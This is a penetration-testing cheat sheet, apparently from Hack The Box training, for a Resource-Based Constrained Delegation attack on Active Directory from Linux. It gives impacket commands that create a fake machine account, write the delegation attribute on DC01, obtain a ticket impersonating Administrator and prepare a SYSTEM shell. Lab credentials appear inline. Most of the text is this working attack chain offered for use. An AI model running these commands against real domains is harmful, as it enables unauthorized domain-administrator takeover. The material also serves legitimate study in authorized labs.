# 09.11 RBCD Resource-Based Constrained Delegation Linux

> Chain `addcomputer.py` → `rbcd.py` → `getST.py` → `psexec.py` for the full Linux RBCD path against any GenericAll-target computer.

## Overview

The Linux RBCD attack uses addcomputer.py to create the fake machine account, rbcd.py to write the delegation attribute, getST.py for the S4U chain, and psexec.py for the shell. The flow mirrors the Windows attack but uses impacket throughout and requires the carole.holmes credential with GenericAll on DC01.

## Steps

- Create the fake machine account with addcomputer.py providing name, password, and DC IP.
- Run rbcd.py targeting DC01 and specifying the fake computer name to write the delegation attribute.
- Retrieve the TGS impersonating Administrator with getST.py -spn cifs/DC01 -impersonate Administrator.
- Export KRB5CCNAME and use psexec.py -k -no-pass to get a SYSTEM shell.

## Commands

### addcomputer create machine account

```bash
addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+! -dc-ip <TARGET> <DOMAIN>.local/carole.holmes
```

### rbcd write delegation attribute

```bash
python3 rbcd.py -dc-ip <TARGET> -t DC01 -f HACKTHEBOX <DOMAIN>\\carole.holmes:Y3t4n0th3rP4ssw0rd
```

### getST impersonate Administrator

```bash
getST.py -spn cifs/DC01.<DOMAIN>.local -impersonate Administrator -dc-ip <TARGET> <DOMAIN>.local/HACKTHEBOX:Hackthebox123+!
```

### psexec with ticket

```bash
export KRB5CCNAME=./Administrator.ccache
```
